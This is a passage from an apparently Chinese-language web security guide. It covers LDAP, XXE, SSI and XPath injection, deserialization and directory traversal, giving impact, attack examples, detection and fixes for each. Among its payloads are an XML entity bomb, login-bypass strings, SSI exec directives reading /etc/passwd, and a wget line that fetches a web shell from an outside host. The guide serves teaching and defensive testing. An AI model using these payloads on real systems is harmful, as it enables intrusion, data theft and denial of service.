class="line-numbers language-http"><code class="language-http">  searchlogin="(&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=&amp;#123;MD5&amp;#125;X03MO1qnZdYdgyfeuILPmQ==))";  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    这是正确的，而且永远都是正确的。这样，测试人员将以<code>LDAP</code>树中的第一个用户身份获得登录状态。</p><p><strong>修复建议</strong></p><ul><li><p>防止<code>LDAP</code>注入的最佳方法是使用必要的验证方案，以确保进入查询的数据不包含任何攻击。但是，在某些情况下，有必要在传递给<code>LDAP</code>查询的输入中包含特殊字符。在这种情况下，使用转义可以防止<code>LDAP</code>解释器认为那些特殊字符实际上是<code>LDAP</code>查询的一部分。</p></li><li><p>在<code>LDAP</code>的目录结构的<code>DN</code>（<code>Distinguished Name</code>）中需要使用“\”转义的特殊字符</p><pre class="line-numbers language-html"><code class="language-html">&amp;!|=&lt;>,+-"';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>需要使用{\ASCII}转义的特殊字符</p><pre class="line-numbers language-html"><code class="language-html">(     <span class="token entity" title="&#123;">&amp;#123;</span>\28<span class="token entity" title="&#125;">&amp;#125;</span>)     <span class="token entity" title="&#123;">&amp;#123;</span>\29<span class="token entity" title="&#125;">&amp;#125;</span>\     <span class="token entity" title="&#123;">&amp;#123;</span>\5c<span class="token entity" title="&#125;">&amp;#125;</span>*     <span class="token entity" title="&#123;">&amp;#123;</span>\2a<span class="token entity" title="&#125;">&amp;#125;</span>/     <span class="token entity" title="&#123;">&amp;#123;</span>\2f<span class="token entity" title="&#125;">&amp;#125;</span>NUL   <span class="token entity" title="&#123;">&amp;#123;</span>\0<span class="token entity" title="&#125;">&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="XML外部实体注入（XXE）"><a href="#XML外部实体注入（XXE）" class="headerlink" title="XML外部实体注入（XXE）"></a>XML外部实体注入（XXE）</h3><p><strong>漏洞描述</strong></p><ul><li><code>XML</code>外部实体攻击是针对应用程序解析<code>XML</code>输入类型的攻击。当弱配置的<code>XML</code>解析器处理包含对外部实体的引用的<code>XML</code>输入时，就会发生此攻击。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>泄露机密数据。</p></li><li><p>拒绝服务。</p></li><li><p>伪造服务器端请求（<code>SSRF</code>）。</p></li><li><p>参数实体，读取任意文件。</p></li><li><p>通过<code> Xinclude</code> 包含外部资源。</p></li><li><p>进行内网端口扫描探测。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：<code>Billion Laughs</code> 攻击，此攻击会使<code>XML</code>解析器的内存过载，从而造成目标拒绝服务：</p><p>请求包</p><pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://example.com/xml HTTP/1.1</span>&lt;?xml version="1.0" encoding="ISO-8859-1"?> &lt;!DOCTYPE foo [  &lt;!ELEMENT foo ANY>  &lt;!ENTITY bar "World ">  &lt;!ENTITY t1 "&amp;bar;&amp;bar;">  &lt;!ENTITY t2 "&amp;t1;&amp;t1;&amp;t1;&amp;t1;">  &lt;!ENTITY t3 "&amp;t2;&amp;t2;&amp;t2;&amp;t2;&amp;t2;">]>&lt;foo>  Hello &amp;t3;&lt;/foo><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>响应包</p><pre class="line-numbers language-http"><code class="language-http"><span class="token response-status">HTTP/1.0 <span class="token property">200 OK</span></span> Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>源代码审计：</p><p>如果以下<code>Java API</code>配置不正确，则目标系统可能容易受到<code>XXE</code>的攻击。</p><pre class="line-numbers language-java"><code class="language-java">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>DocumentBuilderjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>DocumentBuildFactoryorg<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>EntityResolverorg<span class="token punctuation">.</span>dom4j<span class="token punctuation">.</span>*javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>SAXParserjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>SAXParserFactoryTransformerFactorySAXReaderDocumentHelperSAXBuilderSAXParserFactoryXMLReaderFactoryXMLInputFactorySchemaFactoryDocumentBuilderFactoryImplSAXTransformerFactoryDocumentBuilderFactoryImplXMLReaderXerces<span class="token operator">:</span> DOMParser<span class="token punctuation">,</span> DOMParserImpl<span class="token punctuation">,</span> SAXParser<span class="token punctuation">,</span> XMLParser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查源代码是否将<code>docType</code>，外部<code>DTD</code>和外部参数实体设置为禁止使用。</p><p><code>C</code>语言<code>xml</code>解析库源代码检查关键字：</p><pre class="line-numbers language-c"><code class="language-c">libxml2<span class="token punctuation">:</span> xmlCtxtReadMemory<span class="token punctuation">,</span>xmlCtxtUseOptions<span class="token punctuation">,</span>xmlParseInNodeContext<span class="token punctuation">,</span>xmlReadDoc<span class="token punctuation">,</span>xmlReadFd<span class="token punctuation">,</span>xmlReadFile<span class="token punctuation">,</span>xmlReadIO<span class="token punctuation">,</span>xmlReadMemory<span class="token punctuation">,</span>xmlCtxtReadDoc<span class="token punctuation">,</span>xmlCtxtReadFd<span class="token punctuation">,</span>xmlCtxtReadFile<span class="token punctuation">,</span>xmlCtxtReadIOlibxerces<span class="token operator">-</span>c<span class="token punctuation">:</span> XercesDOMParser<span class="token punctuation">,</span>SAXParser<span class="token punctuation">,</span>SAX2XMLReader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用<code>wfuzz</code>工具：<code>https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt</code></p></li></ul><p><strong>修复建议</strong></p><ul><li><p>防止<code>XXE</code>的最安全方法始终是完全禁用<code>DTD</code>（外部实体）。</p></li><li><p>使用开发语言提供的禁用外部实体的方法：</p><pre><code>PHPlibxml_disable_entity_loader(true);JAVADocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Pythonfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre></li></ul><p>过滤用户提交的<code>XML</code>数据：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者，<code>SYSTEM</code>和<code>PUBLIC</code>。</p><h3 id="SSI注入"><a href="#SSI注入" class="headerlink" title="SSI注入"></a>SSI注入</h3><p><strong>漏洞描述</strong></p><ul><li><p><code>SSI</code>是<code>Web</code>应用程序上存在的指令，用于向HTML页面提供动态内容。它们与<code>CGI</code>相似，除了<code>SSI</code>用于在加载当前页面之前或在可视化页面时执行某些操作。为此，<code>Web</code>服务器在将页面提供给用户之前先分析<code>SSI</code>。</p></li><li><p>服务器端包含攻击允许通过在HTML页面中注入脚本或远程执行任意代码来利用<code>Web</code>应用程序。可以通过操纵应用程序中使用的SSI来利用它，也可以通过用户输入字段来强制使用它。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li>攻击者可以访问敏感信息，例如密码文件，并执行未经授权的代码或命令。<code>SSI</code>伪指令注入到输入字段中，并将它们发送到<code>Web</code>服务器。<code>Web</code>服务器在提供页面之前会解析并执行指令。然后，下次为用户的浏览器加载页面时，攻击结果将可见。</li></ul><p><strong>攻击案例</strong></p><p>场景1：根据所使用的服务器操作系统，用于注入<code>SSI</code>的命令会有所不同。以下命令代表应用于执行<code>OS</code>命令的语法。</p><p>​    <code>Linux</code>：</p><pre class="line-numbers language-html"><code class="language-html">列出目录文件：<span class="token comment" spellcheck="true">&lt;!--#exec cmd="ls" --></span>访问目录：<span class="token comment" spellcheck="true">&lt;!--#exec cmd="cd /root/dir/">访问目录：&lt;!--#exec cmd="cd /root/dir/">执行脚本：&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    <code>Windows</code>：</p><pre class="line-numbers language-html"><code class="language-html">列出目录文件：<span class="token comment" spellcheck="true">&lt;!--#exec cmd="dir" --></span>访问目录：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!--#exec</span> <span class="token attr-name">cmd</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cd C:\admin\dir<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>场景2：</p><p>​    可用于访问和设置服务器信息的其他<code>SSI</code>示例：</p><pre class="line-numbers language-html"><code class="language-html">要更改错误消息输出：<span class="token comment" spellcheck="true">&lt;!--#config errmsg="File not found, informs users and password"--></span>要显示当前文档的文件名：<span class="token comment" spellcheck="true">&lt;!--#echo var="DOCUMENT_NAME" --></span>要显示虚拟路径和文件名：<span class="token comment" spellcheck="true">&lt;!--#echo var="DOCUMENT_URI" --></span>使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式：<span class="token comment" spellcheck="true">&lt;!--#config timefmt="A %B %d %Y %r"--></span>使用“ fsize”命令，可以打印所选文件的大小：<span class="token comment" spellcheck="true">&lt;!--#fsize file="ssi.shtml" --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>前提条件：</p><p>支持服务器端的<code>Web</code>服务器包括并启用了它们，用户可控制的输入，可以包含<code>Web</code>服务器的包含指令。</p><p>查找流行的页面文件名。攻击者将在URL中寻找<code>.shtml</code>，<code>.shtm</code>，<code>.asp</code>，<code>.aspx</code>和其他知名字符串，以帮助确定是否启用了<code>SSI</code>功能。</p><p>提取<code>.htaccess</code>文件。在<code>Apache Web</code>服务器安装中，<code>.htaccess</code>文件可以在特定位置启用服务器端包含。在这些情况下，<code>.htaccess</code>文件位于启用<code>SSI</code>的目录中，并且从理论上讲可以从<code>Web</code>服务器获取。尽管大多数<code>Web</code>服务器都拒绝获取<code>.htaccess</code>文件，但配置错误的服务器将允许它。</p><p>使用代理工具来跟踪和记录所有链接。特别注意<code>URL</code>中包含参数的任何链接。</p><p>使用代理工具记录在手动遍历<code>Web</code>应用程序期间访问的所有链接。特别注意<code>URL</code>中包含参数的任何链接。经常需要使用这种类型的手动遍历来识别属于<code>GET</code>方法形式而不是<code>POST</code>形式的形式。</p></li><li><p>常见测试代码：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#echo var="DATE_LOCAL" --></span>打印当前时间。<span class="token comment" spellcheck="true">&lt;!--#include virtual="/cgi-bin/counter.pl" --></span>包括CGI脚本的输出。<span class="token comment" spellcheck="true">&lt;!--#include virtual="/footer.html" --></span>在目录中包含文件或列表文件的内容。<span class="token comment" spellcheck="true">&lt;!--#exec cmd="ls" --></span>包括系统命令的输出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到潜在的注入点列表后，我们可以检查输入是否正确验证，然后找出所提供输入的存储位置。我们需要确保可以注入<code>SSI</code>指令中使用的字符：</p><pre class="line-numbers language-html"><code class="language-html">&lt; ! # = / . " - > and [a-zA-Z0-9]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了测试验证是否足够，我们可以以输入形式输入例如以下字符串：</p><pre class="line-numbers language-html"><code class="language-html">  <span class="token comment" spellcheck="true">&lt;!--#include virtual="/etc/passwd"  --></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果<code>Web</code>应用程序将使用该数据来构建动态生成的页面，则也可以在<code>HTTP</code>标头中执行注入：</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.0Referer: <span class="token comment" spellcheck="true">&lt;!--#exec cmd="/bin/ps ax"--></span>User-Agent: <span class="token comment" spellcheck="true">&lt;!--#include virtual="/proc/version"--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>修复建议</strong></p><ul><li><p>在全局<code>access.conf</code>文件或本地<code>.htaccess</code>（<code>Apache</code>）文件中设置<code>OPTIONS IncludesNOEXEC</code>，以拒绝不需要它们的目录中的<code>SSI</code>执行。</p></li><li><p>必须对所有用户可控制的输入进行适当的过滤。这包括省略或编码某些可能被解释为<code>SSI</code>指令一部分的字符或字符串。</p></li><li><p>非必要情况下关闭“服务端包含”。</p></li></ul><h3 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a>XPATH注入</h3><p><strong>漏洞描述</strong></p><ul><li><p><code>XPath</code>是一种主要为解决<code>XML</code>文档的某些部分而设计和开发的语言。<code>XPath</code>注入与<code>SQL</code>注入类似，当网站使用用户提供的信息为<code>XML</code>数据构造<code>XPath</code>查询时，就会发生<code>XPath</code>注入攻击。通过将故意格式错误的信息发送到网站，攻击者可以了解<code>XML</code>数据的结构，或访问他们通常无法访问的数据。</p></li><li><p><code>XML</code>的查询是通过<code>XPath</code>完成的，<code>XPath</code>是一种简单的描述性语句，它允许<code>XML</code>查询找到一条信息。与<code>SQL</code>一样，您可以指定要查找的某些属性以及要匹配的模式。在网站上使用<code>XML</code>时，通常会接受查询字符串的某种形式的输入，以标识要定位并显示在页面上的内容。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li><p>如果将<code>XML</code>数据用于身份验证（例如，基于<code>XML</code>的用户文件），他们甚至可以在网站上提升特权。</p></li><li><p>成功利用此漏洞后，攻击者可能会未经适当的授权就绕过身份验证机制或访问信息。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：我们将使用此<code>XML</code>代码段作为示例</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employees</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Arnold<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Baker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>ABaker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>SoSecret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>Admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Peter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Pan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>PPan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>NotTelling<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employees</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    假设我们在网页上有一个用户身份验证系统，该系统使用这种数据文件来登录用户。提供用户名和密码后，该软件可能会使用<code>XPath</code>查找用户：</p><pre class="line-numbers language-vb"><code class="language-vb">VB:Dim FindUserXPath as StringFindUserXPath = "//Employee[UserName/text()='" & Request("Username") & "' And        Password/text()='" & Request("Password") & "']"C#:String FindUserXPath;FindUserXPath = "//Employee[UserName/text()='" + Request("Username") + "' And        Password/text()='" + Request("Password") + "']";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    使用普通的用户名和密码，此<code>XPath</code>可以工作，但是攻击者可能发送错误的用户名和密码，并在不知道用户名或密码的情况下选择了<code>XML</code>节点，如下所示：</p><pre class="line-numbers language-bash"><code class="language-bash">Username: blah<span class="token string">' or 1=1 or '</span>a<span class="token string">'='</span>aPassword: blahFindUserXPath becomes //Employee<span class="token punctuation">[</span>UserName/text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'blah'</span> or 1<span class="token operator">=</span>1 or        <span class="token string">'a'</span><span class="token operator">=</span><span class="token string">'a'</span> And Password/text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'blah'</span><span class="token punctuation">]</span>Logically this is equivalent to:        //Employee<span class="token punctuation">[</span><span class="token punctuation">(</span>UserName/text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'blah'</span> or 1<span class="token operator">=</span>1<span class="token punctuation">)</span> or        <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token string">'a'</span> And Password/text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'blah'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    在这种情况下，仅<code>XPath</code>的第一部分需要为真。密码部分变得无关紧要，并且由于“ <code>1 = 1</code>”部分，用户名部分将与所有员工匹配。</p><p><strong>检测方法</strong></p><ul><li><p>在<code>XPath</code>注入测试中，我们测试是否可以将<code>XPath</code>语法注入到应用程序解释的请求中，从而允许攻击者执行用户控制的<code>XPath</code>查询。</p></li><li><p>假设我们的数据库由以下XML文件表示：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>gandalf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>!c3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>account</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>account</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>Stefan0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>w1s3c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>account</span><span class="token punctuation">></span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>account</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>tony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>Un6R34kb!e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>account</span><span class="token punctuation">></span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>account</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个返回用户名<code>gandalf</code>和密码为的帐户的<code>XPath</code>查询<code>!c3</code>如下：</p><pre class="line-numbers language-sql"><code class="language-sql">string<span class="token punctuation">(</span><span class="token comment" spellcheck="true">//user[username/text()='gandalf' and password/text()='!c3']/account/text())</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果应用程序未正确过滤用户输入，则测试人员将能够注入XPath代码并干扰查询结果。例如，测试人员可以输入以下值：</p><pre class="line-numbers language-sql"><code class="language-sql">Username: <span class="token string">' or '</span><span class="token number">1</span><span class="token string">' = '</span><span class="token number">1</span>  Password: <span class="token string">' or '</span><span class="token number">1</span><span class="token string">' = '</span><span class="token number">1</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用这些参数，查询将变为：</p><pre class="line-numbers language-sql"><code class="language-sql">string<span class="token punctuation">(</span><span class="token comment" spellcheck="true">//user[username/text()='' or '1' =  '1' and password/text()='' or '1' = '1']/account/text())  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与常见的<code>SQL </code>注入攻击一样，我们创建了一个始终为<code>true</code>的查询，这意味着即使未提供用户名或密码，应用程序也将对用户进行身份验证。与使用<code>XPath</code>注入的常见<code>SQL</code>注入攻击一样，第一步是在要测试的字段中插入<code>&#39;</code>(单引号)，在查询中引入语法错误，并检查应用程序是否返回错误消息。</p></li></ul><p><strong>修复建议</strong></p><ul><li><p>就像避免<code>SQL</code>注入的技术一样，需要使用参数化的<code>XPath</code>接口，或者转义用户输入以使其可以安全地包含在动态构造的查询中。如果使用引号终止动态构造的<code>XPath</code>查询中的不可信输入，则需要在不可信输入中转义该引号，以确保不可信数据不能尝试脱离该引用上下文。在以下示例中，单引号（<code>&#39;</code>）用于终止<code>Username</code>和<code>Password</code>参数。因此，我们需要用该字符的<code>XML</code>编码版本（即<code>“&#39;”</code>）替换此输入中的所有<code>&#39;</code>字符。</p></li><li><p>使用预编译的<code>XPATH</code>查询，预编译的<code>XPath</code>查询是在程序执行前已经预设。</p></li></ul><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><strong>漏洞描述</strong></p><ul><li><p>序列化和反序列化是指以下过程：获取程序内部与对象相关的数据，将其打包以允许将数据从外部存储或传输（“序列化”），然后提取序列化的数据以重建原始对象（“反序列化”）。</p></li><li><p>序列化是将某些对象转换为可以稍后恢复的数据格式的过程。人们经常序列化对象，以将其保存到存储中或作为通信的一部分进行发送。</p></li><li><p>反序列化是该过程的逆过程，它采用某种格式构造数据，然后将其重建为对象。如今，用于序列化数据的最流行的数据格式是<code>JSON</code>。在此之前，它是<code>XML</code>。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li>反序列化可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。</li></ul><p><strong>攻击案例</strong></p><p>······ </p><p><strong>检测方法</strong></p><ul><li><p>黑盒测试：</p><p>搜索以下以下列开头的<code>base64</code>编码的内容：</p><pre><code>AAEAAAD/////</code></pre><p>搜索带有以下文本的内容：</p><pre><code>TypeObject$type:  </code></pre><p>白盒测试：</p><p>在源代码中搜索以下术语：</p><pre><code>TypeNameHandlingJavaScriptTypeResolver </code></pre></li></ul><p><strong>修复建议</strong></p><ul><li><p>不允许数据流定义将反序列化到的对象的类型。可以通过使用<code>DataContractSerializer</code>或<code>XmlSerializer</code>尽可能避免这种情况。</p></li><li><p>使用替代数据格式：通过避免本机（反）序列化格式，可以大大降低风险。通过切换为<code>JSON</code>或<code>XML</code>之类的纯数据格式，可以减少自定义反序列化逻辑重新用于恶意目的的机会。</p></li><li><p>仅反序列化签名数据：如果应用程序在反序列化之前知道需要处理哪些消息，则可以在序列化过程中对它们进行签名。然后，应用程序可以选择不对没有身份验证签名的任何消息进行反序列化。</p></li></ul><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><strong>漏洞描述</strong></p><ul><li>由于<code>Web</code>服务器或者<code>Web</code>应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以使<code>Web</code>根目录以外的文件），甚至执行系统命令。 程序在实现上没有充分过滤用户输入的<code>../</code>之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>攻击者可能能够创建，覆盖，删除或破坏，用于执行代码的关键文件，例如程序或库。</p></li><li><p>如果目标文件用于安全机制，则攻击者可能能够绕过该机制。例如，在密码文件末尾附加新帐户可能使攻击者可以绕过身份验证。</p></li><li><p>攻击者可能能够读取意外文件的内容并暴露敏感数据。如果目标文件用于安全机制，则攻击者可能能够绕过该机制。例如，通过读取密码文件，攻击者可以进行暴力破解密码猜测攻击，以便获取目标系统帐户权限。</p></li><li><p>可能会完全阻止目标运行，并且在使用诸如身份验证之类的保护机制的情况下，它可能会锁定目标的每个用户。</p></li><li><p>攻击者可能使用目录遍历来下载服务器配置文件，其中包含敏感信息并可能暴露更多服务器漏洞。最终，攻击者可以访问机密信息，甚至可以完全控制服务器。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：以下是<code>perl</code>语言的目录遍历代码示例，其中每个用户的个人资料信息都存储在单独的文件中，并且所有文件都存储在一个目录中。</p><pre class="line-numbers language-perl"><code class="language-perl"><span class="token keyword">my</span> <span class="token variable">$dataPath</span> <span class="token operator">=</span> <span class="token string">"/users/root/profiles"</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$username</span> <span class="token operator">=</span> param<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$profilePath</span> <span class="token operator">=</span> <span class="token variable">$dataPath</span> <span class="token operator">.</span> <span class="token string">"/"</span> <span class="token operator">.</span> <span class="token variable">$username</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"&lt;$profilePath"</span><span class="token punctuation">)</span> <span class="token operator">||</span> ExitError<span class="token punctuation">(</span><span class="token string">"profile read error: $profilePath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token 